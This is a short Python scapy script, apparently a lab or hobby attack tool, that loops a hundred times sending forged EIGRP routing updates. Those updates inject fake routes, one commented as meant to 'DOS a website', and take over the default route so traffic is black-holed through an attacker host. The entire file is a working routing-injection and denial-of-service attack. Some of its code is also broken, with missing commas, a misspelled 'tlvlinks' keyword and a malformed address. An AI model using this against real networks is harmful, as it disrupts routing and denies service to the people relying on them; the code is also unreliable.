# Fake routing injection to BLACK HOLE network

# Import time so that we can set a sleep time
import time
# Import scapy
from scapy.all import *
# Import EIGRP
load_contrib('eigrp')

# For look to send multiple packets
for i in range (0,100):
    #Inject Fake route 192.168.100.0
    sendp(Ether()/IP(src="192.168.1.248", dst="224.0.0.10") \
            /EIGRP(opcode="Update", asn=100, seq=0, ack=0 \
            tlvlist=[EIGRPIntRoute(dst="192.168.100.0", nexthop="192.168.1.248")]))


    #Inject fake route 192.168.101.0
    sendp(Ether()/IP(src="192.168.1.248", dst="224.0.0.10") \
            /EIGRP(opcode='Update', asn=100, seq=0, ack=0, \
            tlvlist=[EIGRPIntRoute(dst="192.168.101.0", nexthop="192.168.1.248")]))

    #DOS a website on the network that is being used
    sendp(Ether()/IP(src="192.168.1.248", dst="224.0.0.10") \
            /EIGRP(opcode="Update", asn=100, seq=0, ack=0, \
            tlvlist=[EIGRPIntRoute(dst="72.163.4.0", nexthop="192.168.1.248")]))

    #Change default route
    sendp(Ether()/IP(src='192.168.1.248', dst='224.0.0.10') \
            /EIGRP(opcode="Update", asn=100, seq=0, ack=0 \
            tlvlinks=[EIGRPExtRoute(dst='0.0.0.0', nexthop='192.168.1.248', \
            originroute='192.168.248', prefixlen=0, flags='candidate-default')]))

    time.sleep(2)
